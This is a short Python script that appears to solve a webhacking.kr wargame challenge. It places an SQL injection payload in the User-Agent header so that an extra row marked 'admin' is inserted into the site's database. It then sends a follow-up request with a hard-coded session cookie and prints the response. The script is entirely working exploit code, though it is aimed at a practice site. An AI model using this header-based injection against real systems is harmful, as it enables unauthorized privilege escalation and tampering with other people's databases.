import requests

cookie = {'PHPSESSID':'2rm704ctvh6s4bq3s4609e0l2q'}
url = "http://webhacking.kr/challenge/web-08"
header = {'User-Agent':"test','','admin'),('"}

res = requests.get(url, headers=header, cookies=cookie)

header = {'User-Agent':'test'}
res = requests.get(url, headers=header, cookies=cookie)
print(res.text)
